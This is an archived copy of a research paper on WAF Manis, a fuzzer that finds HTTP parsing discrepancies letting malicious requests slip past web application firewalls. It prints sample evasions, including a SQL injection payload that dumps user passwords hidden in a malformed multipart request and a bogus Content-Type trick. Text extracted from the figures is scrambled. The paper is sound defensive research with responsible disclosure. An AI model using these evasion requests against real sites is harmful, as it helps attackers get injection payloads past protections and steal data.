---
type: Whitepaper
title: "Break the Wall from Bottom: Automated Discovery of Protocol-Level Evasion Vulnerabilities in Web Application Firewalls"
description: "WAF Manis fuzzes grammar-derived malformed HTTP requests to find parsing disagreements between a web application firewall and the backend framework: duplicate Content-Type headers, malformed multipart boundaries, encoded parameters, and transfer-encoding tricks. The 311 cases found let an attacker hide any payload from 14 WAFs."
resource: "https://www.jianjunchen.com/p/wafmanis.sp24.pdf"
tags: [whitepaper, webseclist-reference, waf-bypass, parser-differential, content-type, mime, charset, waf, http, fuzzing, tooling, novel-technique, owasp-a02-2021, owasp-a05-2021]
generated:
  by: webseclist-refs/1
  at: "2026-08-11T17:35:45+00:00"
status: stable
stale_after: 2027-08-11
sources:
  - id: original
    resource: "https://www.jianjunchen.com/p/wafmanis.sp24.pdf"
    title: "Break the Wall from Bottom: Automated Discovery of Protocol-Level Evasion Vulnerabilities in Web Application Firewalls"
    author: Qi Wang, Jianjun Chen, Zheyu Jiang, Run Guo, Ximeng Liu, Chao Zhang, Haixin Duan
also_at: []
authors:
  - Qi Wang
  - Jianjun Chen
  - Zheyu Jiang
  - Run Guo
  - Ximeng Liu
  - Chao Zhang
  - Haixin Duan
canonical_url: ""
cited_by:
  - "2024.md:53"
commit: ""
content_sha256: f4f04d3cd9f2ceb8e898af0adc90daf21208d1f9f0f8b68d9b9930c6abc3c2f5
depth: full
depth_reason: default
kind: whitepaper
language: ""
licence: unknown
original_url: "https://www.jianjunchen.com/p/wafmanis.sp24.pdf"
published: ""
publisher: ""
publisher_english: ""
raw_sha256: 377dfc33d4859b986716f22bf5396e6ca36b01fded8ac7bf0247ed8361cdece6
retrieved_from: "https://www.jianjunchen.com/p/wafmanis.sp24.pdf"
retrieved_kind: stored
retrieved_utc: "2026-08-11T17:35:45+00:00"
slug: break-wall-bottom-automated-discovery-protocol-level-evasion-firewalls
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Break the Wall from Bottom: Automated Discovery of Protocol-Level Evasion Vulnerabilities in Web Application Firewalls

**Break the Wall from Bottom: Automated Discovery of Protocol-Level Evasion Vulnerabilities in Web Application Firewalls** - Qi Wang, Jianjun Chen, Zheyu Jiang, Run Guo, Ximeng Liu, Chao Zhang, Haixin Duan, Publisher not stated.

- Published: date not stated
- Original: <https://www.jianjunchen.com/p/wafmanis.sp24.pdf>
- Preserved from: https://www.jianjunchen.com/p/wafmanis.sp24.pdf (stored) on 2026-08-11
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

Break the Wall from Bottom: Automated Discovery of Protocol-Level Evasion
                     Vulnerabilities in Web Application Firewalls

   Qi Wang∗ , Jianjun Chen∗† B , Zheyu Jiang∗ , Run Guo∗ , Ximeng Liu‡ , Chao Zhang∗† and Haixin Duan∗†
                                                       ∗ Tsinghua University
                                                     † Zhongguancun Laboratory
                                                        ‡ Fuzhou University



Abstract—Web Application Firewalls (WAFs) are a crucial line        should either be protected by a WAF or successfully pass a
of defense against web-based attacks. However, an emerging          code review process [5]. The growing reliance on WAFs has
threat comes from protocol-level evasion vulnerabilities, in        led to a substantial market value, projected to reach USD
which adversaries exploit parsing discrepancies between the         21.05 billion by 2030 [38].
WAF HTTP parser and those of web applications to circumvent             Given the popularity and importance of WAFs, sig-
WAFs. Currently, uncovering these vulnerabilities still depends     nificant research has been dedicated to auditing and test-
on manual, ad hoc methods. In this paper, we propose WAF            ing WAF rulesets. These investigations typically involve
Manis, a novel testing methodology to automatically discover        modifying the payload of a malevolent request to evade
protocol-level evasion vulnerabilities in WAFs. We evaluated        the pattern recognition of WAF rule sets. For example,
WAF Manis against 14 popular WAFs including Cloudflare              SQLMap [43] obfuscated attacking payloads to evaluate
and ModSecurity and 20 popular web frameworks including             WAFs against SQL injection attacks. Luca et al. [18] utilize
Laravel and Spring. In total, we discovered 311 protocol-level      an adversarial machine learning algorithm to alter the origi-
evasion cases affecting all tested WAFs and applications. Due       nal malicious payload and bypass WAFs. Qiu et al. [36] use
to the generic nature of protocol-level evasions, these evasion     a Monte Carlo tree search guided approach to automatically
vulnerabilities do not hinge on specific payload patterns and       find SQL injection bypass payloads. WAF vendors also
can transmit any malicious payloads - for instance, SQL injec-      actively incentivize the discovery of WAF evasion tech-
tion, XSS, or Log4jShell - to the target websites. We further
                                                                    niques. For instance, Alibaba Cloud provides a bug bounty
                                                                    rewards of approximately USD 800 for each discovered
analyzed these vulnerabilities and identified three primary
                                                                    WAF evasion vulnerability [2].
reasons contributing to WAF evasions. We have reported those
                                                                        However, prior studies have shown that protocol-level
identified vulnerabilities to the affected providers and received
                                                                    WAFs evasion vulnerabilities have emerged as a growing
acknowledgments and bug bounty rewards from Cloudflare
                                                                    threat [8], [25], [26], [39]. These vulnerabilities stem from
WAF, Fortinet WAF, Alibaba Cloud WAF, Huawei Cloud WAF,
                                                                    the discrepancies in parsing HTTP requests between WAFs
ModSecurity, Go security Team, and the PHP security team.
                                                                    and applications. Attackers can exploit these inconsistencies
                                                                    to manipulate protocol-level operations, such as how HTTP
1. Introduction                                                     requests are structured and parsed. This allows attackers to
                                                                    effectively ’hide’ any malicious payloads within the opera-
    Web Applications Firewalls (WAFs) have become fun-              tions of the protocol itself. As a result, these vulnerabilities
damental building blocks of modern application security. As         can be used to transmit any type of malicious content,
an increasing number of websites transition to cloud-based          including but not limited to SQL injection, XSS, Log4jShell,
platforms, and the prevalence of Web attacks continues to           etc., effectively bypassing the protection provided by WAFs.
rise, more and more websites are relying on web application         This makes them a potent tool for attackers, as they can
firewalls (WAFs) to ensure the security of their web applica-       adapt to different attack payloads, making them more chal-
tions. WAFs provide an additional layer of protection to web        lenging to detect and prevent.
applications by intercepting and scrutinizing inbound web               Despite posing a significant threat, the discovery of
traffic to detect and block malicious requests. Web adminis-        these protocol-level evasion vulnerabilities is still reliant on
trators can utilize WAFs as virtual patches to prevent various      manual, ad hoc methods. They are difficult to find with
attacks without altering the underlying codebase of the Web         state-of-the-art testing tools, mainly due to three key chal-
application. Due to those advantages, the deployment of             lenges: First, existing WAF testing tools focus on generating
WAFs is mandated by compliance regulations. For example,            malicious payloads rather than malformed HTTP requests,
the PCI standard, set for organizations handling credit card        which is insufficient for discovering protocol-level evasions.
transactions, dictates that any application facing the internet     Second, previous works usually generate test cases blindly
                                                                    because most commercial WAFs are closed-source products,
   B Corresponding author: jianjun@tsinghua.edu.cn
                                                                    and can only be interacted with remotely, which makes
testing ineffective; Third, there is a lack of vulnerability          popular WAFs, including Cloudflare, Modsecurity,
detector to examine the HTTP parsers of web applications              Huawei Cloud WAF and Alibaba Cloud WAF.
to detect protocol-level evasion vulnerabilities.                   • Responsible Disclosure. We responsibly reported our
    To tackle those challenges, we propose WAF Ma-                    findings to affected vendors and received positive feed-
nis, a novel testing methodology to automatically discover            back.
protocol-level evasion vulnerabilities in web application fire-
walls. For the first challenge, we design a grammar tree-         2. Background
based payload-aware generation approach. This method al-
lows us to generate and mutate high-quality HTTP requests         2.1. Web Application Firewall
that contain testing payloads and ensure these payloads are
not modified during mutation. For the second challenge, we            Web applications receive a variety of HTTP parameters
combine the strengths of white-box and black-box testing.         from users. For instance, in a GET request, the parameters
We first leverage open-source web applications for white-         are typically included in the URL as query parameters,
box testing, using their code coverage to guide the gen-          whereas in a POST request, the parameters are sent in the
eration of testing HTTP requests. We then forward these           request body with the Content-Type header indicating the
requests to commercial WAFs for black-box testing. For            body’s mime type. However, attackers may exploit these pa-
the third challenge, we design a testing harness to detect        rameters to deliver malicious payloads intended to compro-
protocol-level evasion vulnerabilities. This harness extracts     mise web applications. Such payloads might include harmful
parameters and form data from different backend applica-          SQL code, cross-site scripts, or forced commands embedded
tions and checks for embedded malicious payloads. If a test       within these parameters, leading to various attacks including
request can pass WAF inspection, while the web application        SQL injection, Cross-Site scripting (XSS), and command
recognizes the embedded malicious payload from parsed             injections.
data, we use this disparity to identify potential protocol-           To mitigate these threats, Web Application Firewalls
level evasion vulnerabilities.                                    (WAFs) are widely deployed to safeguard web applica-
    We developed an automated testing tool, WAF Manis,            tions. A WAF serves as a protective intermediary between
and evaluated it against 14 popular WAFs, including 8             clients and web applications. It works at the application
commercial WAFs and 6 open-source WAFs, along with                layer (HTTP/HTTPS), filtering, monitoring, and blocking
20 popular backend applications. In total, we discovered          HTTP(S) traffic to and from the web application, thereby
311 bypass vulnerabilities affecting all tested WAFs and          providing a robust defense against malicious threats.
frameworks. Due to the universal nature of protocol-level             WAFs primarily operate by inspecting HTTP parameters
evasion vulnerabilities, these vulnerabilities can be used to     to detect and block malicious payload in HTTP(S) requests.
transmit any malicious payloads to the target websites. We        This is usually achieved by implementing a set of rules
further analyzed these vulnerabilities and identified three       known as a ruleset. A ruleset comprises patterns that are
primary causes leading to protocol-level WAF evasions:            dangerous or anomalous. If any HTTP parameters coincide
(1) Parameter type Confusion; (2) Differences in parsing          with a pattern within the ruleset, the WAF either flags or
malformed parameter structure; (3) Inconsistencies in sup-        blocks the associated HTTP request.
porting RFCs. Some evasion cases are even rooted in the               Currently, the most influential WAF ruleset is the
PHP and Go programming languages. We have respon-                 OWASP Core Rule Set (CRS) [17], which is widely used in
sibly reported all identified vulnerabilities to the affected     various commercial WAFs, including Google Cloud Armor,
providers and received acknowledgments and bug bounty             AWS WAF, Azure WAF, etc. The CRS provides detection
rewards from Cloudflare WAF, Fortinet WAF, Alibaba Cloud          rules for use with ModSecurity and aims to protect the web
WAF, Huawei Cloud WAF, ModSecurity, the Go security               application from common attacks such as those defined in
team, and the PHP security team.                                  the OWASP Top Ten.
    Contributions. In summary, we make the following                  A typical ruleset consists of three core elements: 1) Pa-
contributions:                                                    rameters: These are HTTP parameters like URL parameters
                                                                  and form data that the WAF extracts for rule application; 2)
  • New automated approach to find protocol-level WAF
                                                                  Patterns: These are payload patterns that the rule matches
    evasions. We introduced WAF Manis , a novel testing
                                                                  against, such as signatures of SQL injection payloads; and
    methodology to automatically discover protocol-level
                                                                  3) Action: These are the steps taken when a request matches
    WAF evasion vulnerabilities that broadly threaten web
                                                                  the rule, such as rejection or logging. The following exam-
    applications.
                                                                  ple presents a CRS rule that denies all the requests with
  • New Implementation and Findings. We implemented
                                                                  “’or(1)#” in HTTP parameters, which can be used to
    our methodology and evaluated it on 14 well-known
                                                                  block SQL injection:
    WAFs and 20 popular web frameworks. We found 311
    new vulnerabilities which falls into three categories:               ARGS "@contains ’or(1)#" "deny"                 (1)
    Parameter Type Confusion, Malformed                               Figure 1 illustrates the workflow of WAF. In figure 1a
    Parameter Structure and RFC Support                           when a user transmits json {"id":"1"}, the WAF detects
    Gaps. Those vulnerabilities can be exploited to bypass        the json parameter id value of 1, which does not match
the rules, so the request is forwarded to the WebApp.            past years, Fuzz testing has proven highly successful in
In figure 1b when an attacker sends malicious payload            discovering bugs in software systems. Generally, fuzz testing
{"id":"’or(1)#"}, the WAF parses the request, iden-              approaches can be divided into two categories: black-box
tifies that the URL parameter ‘id’ matches the rule, and         fuzzing and white-box fuzzing.
subsequently rejects the request in accordance with the rule’s       Black-box fuzzing refers to testing without using the
defined action.                                                  source code of the target program or runtime-generated
                                                                 information, relying solely on blind input generation to
2.2. WAF Evasion Attack                                          test target programs. Early fuzzing techniques [21], [29]
                                                                 predominantly belong to the realm of black-box fuzzing,
    With web applications providing high-value services,         generating inputs in a completely random manner. How-
attackers are persistently developing new web attack tech-       ever, this approach can be time-consuming and inefficient
niques or variants to bypass the WAFs.                           to trigger deep logical problems since randomly generated
    Payload-Level Evasion. A common way to bypass a              inputs may not effectively cover the specific paths, states, or
WAF is by obfuscating or encoding the malicious payload.         conditions required to trigger deep logical problems within
Attackers can alter the malicious payload of the request to      the target program.
evade the pattern recognition of WAF. Figure 1c shows such           White-box fuzzing, on the other hand, leverages the
an example. In this scenario, an attacker exploits the fact      source code of the target program or runtime-generated
that the SQL interpreter of the target WebApp is not case-       information, to guide input generation and accelerate the
sensitive. Thus an attacker can modify the case of the orig-     discovery of vulnerabilities. A widely used approach is
inal payload to bypass the rule and allow the SQL injection      Coverage-Guided Fuzzing [20], [34], [46] (CGF), which
request to reach the WebApp undetected. By obfuscating the       incorporates code coverage information generated during
original payload without altering its semantics, attackers can   the execution phase of the target program. The main idea
effectively trick the WAF into disregarding the malicious        behind CGF is to select test inputs that have the potential to
payload. Recent work has developed several techniques or         explore new areas of the code, leading to the likelihood of
tools to uncover these payload-level WAF evasions [18],          finding more bugs or vulnerabilities in unexplored areas.
[36], [43]. However, payload-level WAF evasions can be           CGF fuzzer feeds test inputs to the target program and
effectively mitigated by implementing strict input valida-       monitors its execution. The code coverage information of
tion rules. For example, WAFs can prevent the technique          the executing target program can be obtained from specific
in Figure 1c by limiting input parameters to accept only         instructions inserted during compilation [46], directly in-
numerical values. The OWASP Core Rule Set (CRS) also             serted into the binary target program [19], or the support of
offers a broad and robust set of rules to defend against such    specific hardware features [4]. Fuzzer tends to retain inputs
evasion techniques.                                              that generate new code coverage and mutate them, with the
    Protocol-Level Evasion. Protocol-level WAF evasion           expectation that mutated new inputs will reach unexplored
modifies HTTP requests rather than malicious payloads to         areas in the program. AFL (American Fuzzy Loop) [46],
bypass WAFs. Figure 1d shows an example. In HTTP,                originally developed by Michal Zalewski, is one of the most
the Content-Type header indicates the format of the data         popular and widely used tools for CGF.
being sent in the message body. For indicating json
payload, the appropriate Content-Type value to use is
application/json. However, the attacker can con-
                                                                 3. WAF Manis Overview
fuse the WAF by modifying the Content-Type header to
application/x-whatever-json which WAF cannot                     3.1. Threat Model
recognize and parse HTTP parameters. Nevertheless, the
web application, such as those based on the Flask frame-             Generally, the detection process of WAF can be divided
work, can recognize both Content-Type headers and extract        into three phases: (1) Parameter parsing: When receiving
the malicious payloads, consequently triggering SQL injec-       raw HTTP inputs from the clients, the WAF first parses
tion vulnerabilities.                                            them to recognize HTTP parameters; (2) Pattern matching:
    As protocol-level evasion exploits weaknesses in the         The WAF checks whether the parsed parameters are matched
HTTP parsers, it provides a more universal approach to           by the pattern in WAF security policies, such as the CRS
deliver any malicious payloads, thus posing severe threats to    rulesets; (3) Actions: If any parameter matches a pattern
the Web. Yet, currently, there is still a lack of an automatic   in the WAF rulesets, WAF applies the actions in matched
and efficient approach to discovering the protocol-level eva-    rules, such as rejection. Otherwise, the requests pass through
sions, which has motivated our study.                            WAF inspection and are forwarded to web applications.
                                                                 Thus, parameter parsing forms the first step before detection
2.3. Fuzz Testing                                                techniques can be applied to a suspicious HTTP request.
                                                                 Failing to parse the parameters and extract the payloads
    Fuzz testing, also known as fuzzing, is a software testing   could lead to protocol-level WAF evasions.
technique that involves generating enormous inputs to a              Figure 2 presents a real-world case we discovered. Both
program to uncover bugs in an automatic way. Over the            two HTTP requests contain the same malicious payload, but
                                                 Action                Deny
   {"id":"1"}
                                                                                                             Content-type: application/json       Patterns    "@contains 'or(1)#"

                                                                                                             {"id":" 'or(1)#"}                     Action           Deny


                                                                                                                     User                               WAF                         WebApp
          User                                        WAF                                     WebApp


                                                                                                                   Attacker                            WAF                          WebApp

    POST/ HTTP/1.1
            / HTTP/1.1                                                                                       POST / HTTP/1.1                     Parameters   Body Parameters
  POST                                Parameters Body Parameters
    Host:example.com
           example.com               Parameters Body Parameters                                              Host: example.com
  Host:                                                                                                      POST     / HTTP/1.1
                                                                                                             Content-type:    application/json   Parameters    Body Parameters
    Content-type:application/json
                    application/json   Patterns  "@contains 'or(1)#"                                                                              Patterns    "@contains 'or(1)#"
  Content-type:                       Patterns  "@contains 'or(1)#"                                          Host: example.com
                                        Action         Deny                                                  Content-type:
                                                                                                             {"id":" 'or(1)#"}application/json    Patterns
                                                                                                                                                   Action     "@contains
                                                                                                                                                                    Deny'or(1)#"
    {"id":"1"}
  {"id":" 'or(1)#"}                    Action         Deny
                                                                                                                                                   Action           Deny
                                                                                                             {"id":" 'OR(1)#"}



           User                                       WAF                                      WebApp                                                  WAF
                                                                                                                   Attacker                                                         WebApp
        Attacker                                     WAF                                      WebApp
                                                                                                                   Attacker                            WAF                          WebApp
                (a) Benign request passes through WAF inspection                                                                 (b) Malicious request blocked by WAF
                                                                                                             POST / HTTP/1.1                     Parameters    Body Parameters
  POST / HTTP/1.1                            Parameters Body Parameters                                     POST / HTTP/1.1
                                                                                                             Host: example.com                   Parameters    Body Parameters
  POSTexample.com
  Host:    / HTTP/1.1                                                                                       Host: example.com
                                             Parameters Body Parameters                                      Content-type: application/json       Patterns    "@contains 'or(1)#"
  Host: example.com
  Content-type:    application/json           Patterns  "@contains 'or(1)#"                                 Content-type: application/x-
                                                                                                                                                  Patterns    "@contains 'or(1)#"
  Content-type: application/json              Patterns  "@contains 'or(1)#"                                 whatever-json                          Action           Deny
                                               Action         Deny                                           {"id":" 'OR(1)#"}
  {"id":" 'OR(1)#"}                                                                                                                                Action           Deny
  {"id":" 'or(1)#"}                            Action         Deny                                          {"id":" 'or(1)#"}




                                                                                                                   Attacker                            WAF                          WebApp
        Attacker                                     WAF                                      WebApp               Attacker                            WAF                          WebApp
           Attacker                               WAF                                   WebApp
                                 (c) Payload-level WAF Evasion                                       POST / HTTP/1.1       (d) Protocol-level WAF Evasion
 POST / HTTP/1.1                                                                                     Host: example.com               Parameters Body Parameters
 Host: example.com Figure 1. Four         Parameters
                                               examplesBody         Parameters
                                                               illustrating      the WAF workflow, payload-level
                                                                                                     Content-type: application/x- and protocol-level evasions.
                                                                                                                     WAF evasion,
 Content-type:        application/x-                                                                                                  Patterns   "@contains 'or(1)#"
   POST / HTTP/1.1                         Parameters
                                            Patterns         Body Parameters
                                                            "@contains       'or(1)#"                whatever-json
 whatever-json
   Host: example.com                                                                                                                   Action          Deny
   Content-type: application/json           Patterns
                                             Action         "@contains
                                                                     Deny 'or(1)#"                   {"id":" 'or(1)#"}
 {"id":"
POST      'or(1)#"}
       /vulnerabilities/sqli/ HTTP/1.1            POST /vulnerabilities/sqli/ HTTP/1.1               The core idea is to generate a number of malformed requests
Host: target                                      Host: target
                                             Action                  Deny
   {"id":" 'OR(1)#"}
Content-Type: multipart/form-data; boundary=boundary Content-Type: multipart/form-data; boundary=boundary   to identify the parsing differences between the WAFs and the
--boundary                                           --                                                     WebApps and detect protocol-level evasion vulnerabilities.
Content-Disposition: form-data; name="id";           Content-Disposition: name="id";
                                                     1' union select 1,group_concat(user,0x3a,password)     However,
                                                                                                                  Attackerthere are three major
                                                                                                                                             WAFchallenges in developing this
                                                                                                                                                                    WebApp
          Attacker
1' union select 1,group_concat(user,0x3a,password)   from
                                                     WAF   users --                            WebApp
from users --                                                                                               approach.
--boundary--
         Attacker                                    WAF                                      WebApp             Challenge 1: How to generate and mutate testing
              Normal Malicious Request                            Evasion Malicious Request                 requests efficiently?
  POST / HTTP/1.1                                                                                                The first challenge is to generate a high number of
  Host: example.com              Parameters Body Parameters
  Content-type: application/x-                                                                              high-quality HTTP testing requests capable of triggering
Figure                             Patterns
          2. A motivating example of           "@contains
                                     protocol-level WAF'or(1)#"
                                                          evasion we discov-
  whatever-json                                                                                             protocol-level evasion vulnerabilities. These requests should
ered. The malformed request on the     right can bypass
                                    Action           Denymost major WAFs to
  {"id":" 'or(1)#"}
exploit    PHP-based applications.
                                                                                                            meet two requirements: (1) the testing requests should
                                                                                                            conform to, or closely approximate, the grammar of the
                                                                                                            HTTP protocol because HTTP messages are structured data.
the HTTP structures of the two requests are different. The                                                  Invalid HTTP requests will be rejected by the WAF or
      Attacker
request   on the left, embedding                      WebApp
                                WAFthe malicious payloads  in                                               web application without further processing; (2) the testing
a standard HTTP form, is typically rejected by the WAFs.                                                    requests should always contain a specific payload, and this
In contrast, the request on the right can pass through the                                                  payload should not be modified during the mutation process.
WAF, and the payload can be recognized by PHP-based                                                         Prior WAF testing tools [18], [36], [43] concentrated on
applications with $_POST. This is due to the built-in HTTP                                                  generating malicious payloads rather than malformed HTTP
parser of the PHP programming language, which exhibits                                                      requests, which is insufficient for discovering protocol-level
high tolerance for HTTP protocol.                                                                           evasions.
    In essence, protocol-level evasions are rooted in the                                                        To address this challenge, we have designed a gram-
HTTP parsers of the WAF and the web applications. These                                                     mar tree-based payload-aware generation approach, which
vulnerabilities are typically general WAF evasions and can                                                  includes two phases: generation and mutation. In the first
be exploited to deliver arbitrary malicious payloads. Fur-                                                  phase, we generate initial requests as seeds. We first con-
thermore, many are difficult to mitigate by simply updating                                                 struct grammar trees based on the HTTP grammar from
the rules, thus posing severe security consequences on web                                                  RFC documents and traverse the grammar trees to generate
applications.                                                                                               testing requests. This process starts from the root node and
                                                                                                            selects one of the corresponding grammar rules to generate
3.2. Challenges                                                                                             its child nodes, iteratively expanding the tree until it reaches
                                                                                                            the terminators to generate requests.
    In this study, we propose to develop a novel fuzzing                                                         In the second phase, we mutate the initial seeds to
testing methodology to automatically discover protocol-level                                                generate additional malformed data. This includes two types
evasion vulnerabilities in WAFs to address the rising threat.                                               of mutations: (1) grammar-level mutation, achieved by ma-
nipulating the nodes on the grammar tree, and (2) byte-level      ing work [18], [43] focuses on payload-level evasions and
variations, based on the grammar tree, i.e., mutating the         doesn’t examine the HTTP parsing behaviors of different
bytes of leaf nodes in the grammar tree representing terminal     web application frameworks.
symbols. This phase ensures the discovery of parsing vul-             To address this challenge, we have developed a new vul-
nerabilities caused by non-standard RFC implementations.          nerability detector to detect parsing vulnerabilities between
    To ensure our testing requests always contain the attack-     the WAF and the web applications in a timely manner. For
ing payload, we insert special nonterminal symbols into the       a given testing request, we consider it as a valid protocol-
grammar tree, representing our predefined malicious pay-          level WAF evasion if both the following requirements are
load. When traversing the grammar tree, the special terminal      satisfied: (1) the request containing the malicious payload
symbols are always included in the HTTP request. During           can pass through the WAF to the web applications; (2)
the mutation of requests, we avoid performing deletion or         the native built-in interface of web application frameworks
modifying mutations at the grammar level, and we also do          can recognize our predefined malicious payload in HTTP
not perform byte mutations except when using the encoding         parameters.
operator on the terminal symbol. This ensures that our                Thus, our vulnerability detector includes two parts: (1)
predefined malicious payload remains unaltered during the         WAF Validator, which checks if the request can pass through
mutation process.                                                 any WAF, and (2) WebApp Validator, which extracts HTTP
    Challenge 2: How to test black-box WAFs effectively?          parameters from different web application frameworks, in-
    Many popular WAFs, especially Software as a Service           cluding path parameters, query parameters, header param-
(SaaS) WAFs, are provided as cloud services, for which we         eters, and body parameters, to check if any match our
cannot get access to their source code or even the binary.        predefined payload. As some real-world WAFs modify the
    Black-box fuzzing tools, like Boofuzz [33], primarily         message when forwarding requests, we save the forwarded
rely on monitoring application crashes or error messages          request data in the WAF Validator and then forward it to the
as indicators of potential vulnerabilities. However, protocol-    WebApp Validator for the 2-step validation.
level WAF evasions do not lead to crashes, and the HTTP
response errors can only offer limited feedback. The lack
of fine-grained feedback renders the testing ineffective to
                                                                  4. Design and Implementation
find vulnerabilities. On the other hand, white-box fuzzing,
like Coverage Guided Fuzzing (CGF), has proven highly             4.1. Workflow
successful in discovering bugs. CFG selects seeds for the
next round of mutations based on the program code coverage            Figure 3 shows the workflow of WAF Manis, which
collected in each round. To collect code coverage from run-       can be divided into 9 steps: (1) We collect the grammar
ning programs, CGF requires patching the target program,          rules, such as ABNF rules, from the HTTP RFC documents.
which is not feasible for black-box WAFs.                         (2) These collected rules are forwarded to theGenerator,
    To overcome this challenge, we combine the strengths of       which constructs grammar trees and generates HTTP re-
both white-box and black-box testing. Firstly, we leverage        quests as initial seeds. These initial requests are stored in
open-source web applications for white-box testing, using         the Corpus. (3) In the evolutionary fuzz loop, the program
their code coverage to guide the generation of testing HTTP       selects one testing request from the Corpus to be mutated
requests. If the requests pass web applications validation and    by the Mutator. (4) The mutated requests are forwarded to
the attacking payload can be recognized by these applica-         theWebApp Executor for execution and then to the WebApp
tions, we then forward these requests to commercial WAFs          Validator for validation. (5) The WebApp Executor collects
for black-box testing.                                            the code coverage information during execution, filtering out
    The key observation behind this approach is that both the     good testing requests that contribute to code coverage and
HTTP parsers in applications and WAFs adhere to HTTP              adding them to the Corpus. (6) If a testing request passes
protocol standards. Therefore, using open-source web ap-          the WebApp Validator – meaning the predefined malicious
plication codes can assist in efficiently creating high-quality   payload can be recognized – it is then forwarded to theWAF
HTTP test requests. This approach also reduces the testing        Validator for black-box testing. (7) If a testing request passes
requests for commercial WAFs and accelerates the fuzzing          WAF Validator, it is then forwarded to the Evasion Sample
process, as invalid requests are rejected by web applications     Centrifuge, and the bypassed WAF is recorded. (8) The Eva-
in our local environments before being forwarded to WAFs.         sion Sample Centrifuge replays and minimizes this evasion
    Challenge 3: How to detect protocol-level WAF eva-            example to validate the vulnerability. The validated testing
sion automatically?                                               request is then added to the Corpus for further mutation.
    Previous fuzzing approaches like AFL have achieved            (9) The corresponding raw HTTP message will be saved in
great success in identifying memory vulnerabilities by mon-       Evasion Samples.
itoring program exceptions or memory errors to determine              To summarize, the Generator and Mutator are designed
whether a vulnerability has been triggered [20], [32], [34],      to generate and mutate high-quality HTTP requests contain-
[46], [48]. However, protocol-level WAF evasions typically        ing malicious payloads for testing. WebApp Executor sends
don’t trigger these exceptions and these approaches will          these mutated HTTP requests to theWebApp Validator and
miss these evasions. On the other hand, previous WAF test-        tracks their code coverage during execution. The WebApp
                                                               Figure 3. WAF Manis Workflow



                           root                                                are shown in Figure 4. Each sample of the initial corpus
                    0.8           0.2                                          is generated by creating a tree with the start symbol as
                                                Grammar                        the root. As the algorithm described in Appendix 1, the
                    AC            BC
                          0.1            root -> AC[0.8] | BC [0.2]
              0.9                         A-> DE[0.9] | ADE [0.1]              Generator will expand nonterminal symbols in the tree by
                                           D-> HJ[0.6] | IK[0.4]
                                                    ....
                                                                               randomly selecting possible right-hand sides in the produc-
              DE
        0.6         0.4
                                                                               tion according to their respective weights. Once the tree is
                                                                               fully expanded, the terminal symbols are combined to form
       HJ           IK
                                                                               the HTTP request.

            Figure 4. Generating new sample of initial corpus


                                                                                   By repeating the generation several times, WAF Manis
Validator and WAF Validator evaluate whether the request,
                                                                               collects all the generated samples as the initial corpus. Based
with its target payload, can be recognized by the web ap-
                                                                               on the initial corpus, the Mutator randomly selects a field
plication or successfully bypass the WAF inspection. Lastly,
                                                                               from an original request and applies either grammar-level
the Evasion Sample Centrifuge is designed to minimize and
                                                                               or byte-level mutations to it. For grammar-level mutation,
re-validate the WAF evasion samples. We will elaborate on
                                                                               the mutator selects a non-leaf node from the grammar
these modules in the sections below.
                                                                               tree represented by the intermediate variable and applies
                                                                               the following two strategies: 1) delete the grammar node:
4.2. Generator and Mutator                                                     remove the sub-tree of the non-leaf node from the grammar
                                                                               tree, and 2) duplicate the grammar node: copy the sub-tree
    The Generator and Mutator are developed to generate                        of the non-leaf node and add the sub-tree under the parent
and mutate high-quality HTTP requests for testing, as de-                      node of the node. For byte-level mutation, the mutator can
scribed in section 3. We extracted the grammar rules of                        select a leaf node from the grammar tree represented by
HTTP requests from the RFCs related to the HTTP protocol                       the intermediate variables and apply the following three
(including RFC 1867, 2046, 2231, 2616, 7578, RFC 7230-                         strategies: 1) add a character: insert a random character at
7240). Then, we provide these grammar rules to the Genera-                     a random position in the leaf node, 2) delete a character:
tor to construct the grammar tree. We define an intermediate                   delete a character at a random position in the leaf node
variable serving as the link between the mutation and the                      and 3) encode characters: apply encoding rules to charac-
further generation of the corresponding byte stream. This                      ters, including urlencode, quote-printable, base64, and other
intermediate variable is stored and represented in the struc-                  encoding methods. Specifically, to ensure that the contents
ture of a grammar tree, with any non-leaf node representing                    of our predefined malicious parameters remain unchanged
a nonterminal symbol and any leaf node representing a                          during the mutation process, we do not perform deletion
terminator. In particular, we set two special nonterminal                      mutation on the two special nodes including taint_key
symbols, taint_key and taint_value, representing                               and taint_val, and also do not perform byte mutation
the key-value pairs of our predefined malicious parameters.                    except encoding operator on the terminal symbol pointed to
We extract context-free grammar (CFG) productions from                         by these two nodes. Otherwise, it may cause false positives
related RFC standards for any nonterminal symbol, which                        due to missing malicious parameters in the requests.
4.3. WebApp Executor                                              parsing. The constant SW EBAP P P ASS we defined is not
                                                                  a standard status code, which helps avoid the interference
    To ensure the smooth operation of each fuzzing iteration,     of the server’s original status code. Similarly, we design
the Executor needs to satisfy at least three conditions: 1) The   the WAF-protected WebApp (WAF Validator) to return the
Executor should launch the WebApp in a refreshed state            status code SW AF P ASS regardless of any HTTP request
for each fuzzing iteration; 2) The Executor should return         received and save the raw request for further analysis.
the final execution result and timely terminate each fuzzing          The advantage of this strategy is that the reject char-
iteration; 3) the Executor can obtain the code coverage           acteristics of different WAFs may be inconsistent, but the
information of the WebApp during each round of Fuzz.              accepted characteristics must be the response from the WAF-
    In the classical CGF model, the input samples are passed      protected WebApp. Therefore, when the response status
through shared memory or input files, and since the test          code SW AF P ASS is received in the WAF verification pro-
target is stateless, the executor only needs to wait for the      cess, the request sample can be considered to have suc-
main function under test to finish processing before pro-         cessfully bypassed the WAF. To further improve efficiency,
ceeding to the next round. However, for WebApps whose             we can simultaneously send the sample to different WAF
input is passed through network protocols, the expected           deployment addresses. If the sample successfully bypasses
end signal or end time is uncertain. HTTP protocols are           any of the WAFs, we put it into the Evasion Sample
stateless protocols, but in the fuzzing process, the request      Centrifuge with the corresponding WAF identifier attached.
sample may break the structure of the HTTP protocol when          Additionally, we save the raw request message from the
getting mutated. This can cause the target program to close       WAF to monitor whether the request sample gets modified
the socket earlier than expected or keep waiting for the          by the WAF.
remaining parts of the message. Moreover, for a complex
web application framework, it is challenging to locate the        4.5. Evasion Sample Centrifuge
address of the program where the socket will be released in
advance. As a solution, we measure in advance the average             It seems that as long as the sample has passed both the
